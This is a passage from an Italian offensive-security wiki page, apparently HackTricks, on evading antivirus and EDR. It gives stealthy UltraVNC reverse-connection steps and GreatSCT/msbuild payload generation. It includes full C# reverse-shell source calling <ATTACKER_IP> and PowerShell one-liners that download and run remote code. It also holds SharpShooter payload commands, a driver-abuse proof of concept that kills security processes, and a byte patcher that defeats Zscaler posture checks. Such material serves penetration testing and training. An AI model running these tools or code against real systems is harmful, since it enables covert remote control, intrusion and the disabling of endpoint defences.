Poi, sposta il binario _**winvnc.exe**_ e il file **nuovamente** creato _**UltraVNC.ini**_ all'interno della **vittima**

#### **Connessione inversa**

L'**attaccante** dovrebbe **eseguire all'interno** del suo **host** il binario `vncviewer.exe -listen 5900` in modo che sia **pronto** a catturare una **connessione VNC** inversa. Poi, all'interno della **vittima**: Avvia il demone winvnc `winvnc.exe -run` e esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere la furtività non devi fare alcune cose

- Non avviare `winvnc` se è già in esecuzione o attiverai un [popup](https://i.imgur.com/1SROTTl.png). controlla se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory o aprirà [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per aiuto o attiverai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro di GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **avvia il lister** con `msfconsole -r file.rc` e **esegui** il **payload xml** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**L'attuale difensore terminerà il processo molto rapidamente.**

### Compilare il nostro reverse shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primo C# Revershell

Compilarlo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# utilizzando il compilatore
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
Download e esecuzione automatica:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco di offuscatori C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Utilizzare python per costruire esempi di iniettori:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 ha sfruttato una piccola utility da console nota come **Antivirus Terminator** per disabilitare le protezioni degli endpoint prima di rilasciare ransomware. Lo strumento porta il **proprio driver vulnerabile ma *firmato*** e lo sfrutta per emettere operazioni privilegiate del kernel che anche i servizi AV Protected-Process-Light (PPL) non possono bloccare.

Punti chiave
1. **Driver firmato**: Il file consegnato su disco è `ServiceMouse.sys`, ma il binario è il driver legittimamente firmato `AToolsKrnl64.sys` del “System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver porta una firma Microsoft valida, si carica anche quando l' Enforcement della Firma del Driver (DSE) è abilitato.
2. **Installazione del servizio**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La prima riga registra il driver come **servizio kernel** e la seconda lo avvia in modo che `\\.\ServiceMouse` diventi accessibile dal livello utente.
3. **IOCTL esposti dal driver**
| Codice IOCTL | Capacità                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Termina un processo arbitrario per PID (usato per uccidere i servizi Defender/EDR) |
| `0x990000D0` | Elimina un file arbitrario su disco |
| `0x990001D0` | Scarica il driver e rimuove il servizio |

Prova di concetto minima in C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Perché funziona**:  BYOVD salta completamente le protezioni in modalità utente; il codice che viene eseguito nel kernel può aprire processi *protetti*, terminarli o manomettere oggetti del kernel indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Rilevamento / Mitigazione
•  Abilitare l'elenco di blocco dei driver vulnerabili di Microsoft (`HVCI`, `Smart App Control`) in modo che Windows rifiuti di caricare `AToolsKrnl64.sys`.
•  Monitorare la creazione di nuovi servizi *kernel* e avvisare quando un driver viene caricato da una directory scrivibile a livello mondiale o non presente nell'elenco di autorizzazione.
•  Prestare attenzione agli handle in modalità utente per oggetti dispositivo personalizzati seguiti da chiamate `DeviceIoControl` sospette.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Il **Client Connector** di Zscaler applica regole di postura del dispositivo localmente e si basa su Windows RPC per comunicare i risultati ad altri componenti. Due scelte di design deboli rendono possibile un bypass completo:

1. La valutazione della postura avviene **interamente lato client** (un booleano viene inviato al server).
2. Gli endpoint RPC interni convalidano solo che l'eseguibile connesso sia **firmato da Zscaler** (tramite `WinVerifyTrust`).

Patchando **quattro binari firmati su disco**, entrambi i meccanismi possono essere neutralizzati:

| Binario | Logica originale patchata | Risultato |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Restituisce sempre `1` quindi ogni controllo è conforme |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | NOP-ed ⇒ qualsiasi processo (anche non firmato) può collegarsi ai tubi RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituito da `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Controlli di integrità sul tunnel | Cortocircuitato |

Estratto del patcher minimo:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Dopo aver sostituito i file originali e riavviato il servizio:

* **Tutti** i controlli di postura mostrano **verde/conforme**.
* I binari non firmati o modificati possono aprire i punti di accesso RPC a pipe nominati (ad es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'host compromesso ottiene accesso illimitato alla rete interna definita dalle politiche di Zscaler.

Questo caso studio dimostra come le decisioni di fiducia puramente lato client e semplici controlli di firma possano essere elusi con alcune patch di byte.

## Riferimenti

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
